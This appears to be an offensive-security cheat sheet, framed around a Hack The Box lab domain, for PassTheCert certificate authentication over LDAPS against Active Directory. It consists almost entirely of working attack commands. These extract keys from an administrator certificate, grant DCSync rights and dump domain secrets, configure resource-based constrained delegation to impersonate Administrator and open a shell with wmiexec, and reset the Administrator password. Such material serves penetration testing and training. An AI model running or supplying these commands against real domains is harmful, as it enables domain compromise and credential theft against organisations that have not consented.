# 13.13 PassTheCert LDAPS Certificate Authentication

> Authenticate certs over LDAPS via Schannel when PKINIT errors with `KDC_ERR_PADATA_TYPE_NOSUPP` — `PassTheCert` grants DCSync/RBCD/password resets.

## Overview

When PKINIT is not supported (KDC_ERR_PADATA_TYPE_NOSUPP), certificates can still authenticate via Schannel over LDAPS. PassTheCert (Python/C#) uses a .crt + .key pair to perform LDAP operations: grant DCSync rights, create machine accounts, configure RBCD, or reset passwords. The Windows version (PassTheCert.exe) uses distinguishedname and SID parameters instead.

## Steps

- Extract .key (private key) and .crt (certificate) from .pfx using OpenSSL; optionally strip passphrase
- Grant DCSync rights to a controlled user with -action modify_user -elevate, then secretsdump
- For RBCD: create a new computer with -action add_computer, then set RBCD with -action write_rbcd, then getST.py to impersonate Administrator
- Password reset: -action modify_user -new-pass <password>
- Windows version: use PassTheCert.exe --elevate --target DN --sid for DCSync; --rbcd for RBCD; --reset-password for password reset

## Commands

### openssl extract .key

```bash
openssl pkcs12 -in administrator.pfx -nocerts -out administrator.key
```

### openssl extract .crt

```bash
openssl pkcs12 -in administrator.pfx -clcerts -nokeys -out administrator.crt
```

### openssl strip passphrase

```bash
openssl rsa -in administrator.key -out administrator-nopass.key
```

### passthecert DCSync grant

```bash
python3 passthecert.py -dc-ip <TARGET> -crt administrator.crt -key administrator-nopass.key -domain authority.htb -port 636 -action modify_user -target blwasp -elevate
```

### secretsdump DCSync

```bash
secretsdump.py 'authority.htb/blwasp':'Password123!'@<TARGET>
```

### passthecert add_computer

```bash
python3 passthecert.py -dc-ip <TARGET> -crt administrator.crt -key administrator-nopass.key -domain authority.htb -port 636 -action add_computer -computer-name 'HTB02$' -computer-pass AnotherComputer002
```

### passthecert write_rbcd

```bash
python3 passthecert.py -dc-ip <TARGET> -crt administrator.crt -key administrator-nopass.key -domain authority.htb -port 636 -action write_rbcd -delegate-to 'AUTHORITY$' -delegate-from 'HTB02$'
```

### getST RBCD

```bash
getST.py -spn 'cifs/authority.authority.htb' -impersonate Administrator 'authority.htb/HTB02$:AnotherComputer002'
```

### wmiexec with impersonation TGT

```bash
KRB5CCNAME=Administrator.ccache wmiexec.py -k -no-pass authority.authority.htb
```

### passthecert password reset

```bash
python3 passthecert.py -dc-ip <TARGET> -crt administrator.crt -key administrator-nopass.key -domain authority.htb -port 636 -action modify_user -target administrator -new-pass HackingViaLDAPS001
```

### ntpdate clock sync

```bash
sudo ntpdate <TARGET>
```

### PassTheCert.exe DCSync (Windows)

```powershell
.\PassTheCert.exe --server authority --cert-path .\administrator.pfx --elevate --target DC=AUTHORITY,DC=HTB --sid S-1-5-21-622327497-3269355298-2248959698-12101
```

### PassTheCert.exe add computer (Windows)

```powershell
.\PassTheCert.exe --server authority --cert-path .\administrator.pfx --add-computer --computer-name HTB05
```

### PassTheCert.exe RBCD (Windows)

```powershell
.\PassTheCert.exe --server authority --cert-path .\administrator.pfx --rbcd --target "CN=AUTHORITY,OU=Domain Controllers,DC=authority,DC=htb" --sid S-1-5-21-622327497-3269355298-2248959698-12603
```

### Rubeus RBCD S4U (Windows)

```powershell
.\Rubeus.exe asktgt /user:"HTB05$" /password:"GQnwUyHRd0dLdiG1L3LupCJjNSm3JATR" /domain:authority.htb /impersonate:Administrator /msdsspn:CIFS/AUTHORITY.AUTHORITY.HTB /ptt
```

### PassTheCert.exe password reset (Windows)

```powershell
.\PassTheCert.exe --server authority --cert-path .\administrator.pfx --reset-password --target CN=Administrator,CN=Users,DC=authority,DC=htb --new-password PassTheCertFromWindows001
```
